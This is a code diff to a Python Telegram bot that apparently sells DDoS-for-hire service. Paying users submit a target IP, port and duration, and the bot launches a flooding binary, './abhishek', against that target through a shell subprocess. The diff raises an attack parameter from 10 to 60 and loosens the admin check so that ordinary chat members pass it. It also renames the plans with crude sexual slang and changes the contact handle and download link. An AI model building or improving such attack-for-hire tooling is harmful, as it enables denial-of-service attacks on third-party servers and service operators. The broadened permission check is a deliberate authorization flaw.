@@ -84,12 +84,12 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./abhishek {target_ip} {target_port} {duration} 10")
+    process = await asyncio.create_subprocess_shell(f"./abhishek {target_ip} {target_port} {duration} 60")
     await process.communicate()
 
 def is_user_admin(user_id, chat_id):
     try:
-        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
+        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator', 'member']
     except:
         return False
 
@@ -114,13 +114,13 @@ def approve_or_disapprove_user(message):
     days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
 
     if action == '/approve':
-        if plan == 1:  # Instant Plan 🧡
+        if plan == 1:  # CHUDAI 💦
             if users_collection.count_documents({"plan": 1}) >= 99:
-                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
+                bot.send_message(chat_id, "*Approval failed: CHUDAI 💦 limit reached (99 users).*", parse_mode='Markdown')
                 return
-        elif plan == 2:  # Instant++ Plan 💥
+        elif plan == 2:  # CHUDAI SURU KARO 💦
             if users_collection.count_documents({"plan": 2}) >= 499:
-                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
+                bot.send_message(chat_id, "*Approval failed: CHUDAI SURU KARO 💦 limit reached (499 users).*", parse_mode='Markdown')
                 return
 
         valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
@@ -152,11 +152,11 @@ def attack_command(message):
             return
 
         if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
-            bot.send_message(chat_id, "Your Instant Plan 🧡 is currently not available due to limit reached.")
+            bot.send_message(chat_id, "Your CHUDAI 💦 is currently not available due to limit reached.")
             return
 
         if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
-            bot.send_message(chat_id, "Your Instant++ Plan 💥 is currently not available due to limit reached.")
+            bot.send_message(chat_id, "Your CHUDAI SURU KARO 💦 is currently not available due to limit reached.")
             return
 
         bot.send_message(chat_id, "Enter the target IP, port, and duration (in seconds) separated by spaces.")
@@ -176,14 +176,14 @@ def attack_command(message):
             return
 
         if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
-            bot.send_message(chat_id, "*Your Instant Plan 🧡 is currently not available due to limit reached.*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*Your CHUDAI 💦 is currently not available due to limit reached.*", parse_mode='Markdown')
             return
 
         if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
-            bot.send_message(chat_id, "*Your Instant++ Plan 💥 is currently not available due to limit reached.*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*Your CHUDAI SURU KARO 💦 is currently not available due to limit reached.*", parse_mode='Markdown')
             return
 
-        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*Enter the chudai💦 target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
         bot.register_next_step_handler(message, process_attack_command)
     except Exception as e:
         logging.error(f"Error in attack command: {e}")
@@ -192,7 +192,7 @@ def process_attack_command(message):
     try:
         args = message.text.split()
         if len(args) != 3:
-            bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, "*Sahi se chudai 💦 karo. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
             return
         target_ip, target_port, duration = args[0], int(args[1]), args[2]
 
@@ -201,7 +201,7 @@ def process_attack_command(message):
             return
 
         asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
+        bot.send_message(message.chat.id, f"*CHUDAI DURU HO GAYI 💋\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
     except Exception as e:
         logging.error(f"Error in processing attack command: {e}")
 
@@ -215,8 +215,8 @@ def send_welcome(message):
     markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
 
     # Create buttons
-    btn1 = KeyboardButton("Instant Plan 🧡")
-    btn2 = KeyboardButton("Instant++ Plan 💥")
+    btn1 = KeyboardButton("CHUDAI 💦")
+    btn2 = KeyboardButton("CHUDAI SURU KARO 💦")
     btn3 = KeyboardButton("Canary Download✔️")
     btn4 = KeyboardButton("My Account🏦")
     btn5 = KeyboardButton("Help❓")
@@ -229,13 +229,13 @@ def send_welcome(message):
 
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
-    if message.text == "Instant Plan 🧡":
-        bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
-    elif message.text == "Instant++ Plan 💥":
-        bot.reply_to(message, "*Instant++ Plan selected*", parse_mode='Markdown')
+    if message.text == "CHUDAI 💦":
+        bot.reply_to(message, "*CHUDAI 💦 selected*", parse_mode='Markdown')
+    elif message.text == "CHUDAI SURU KARO 💦":
+        bot.reply_to(message, "*CHUDAI SURU KARO 💦 selected*", parse_mode='Markdown')
         attack_command(message)
     elif message.text == "Canary Download✔️":
-        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/SOULCRACKS/10599*", parse_mode='Markdown')
+        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/c/2410258272/68*", parse_mode='Markdown')
     elif message.text == "My Account🏦":
         user_id = message.from_user.id
         user_data = users_collection.find_one({"user_id": user_id})
@@ -252,9 +252,9 @@ def handle_message(message):
             response = "*No account information found. Please contact the administrator.*"
         bot.reply_to(message, response, parse_mode='Markdown')
     elif message.text == "Help❓":
-        bot.reply_to(message, "*Help selected*", parse_mode='Markdown')
+        bot.reply_to(message, "*Help selected @YTABHIA2Z*", parse_mode='Markdown')
     elif message.text == "Contact admin✔️":
-        bot.reply_to(message, "*Contact admin selected*", parse_mode='Markdown')
+        bot.reply_to(message, "*Contact admin selected @YTABHIA2Z*", parse_mode='Markdown')
     else:
         bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
 
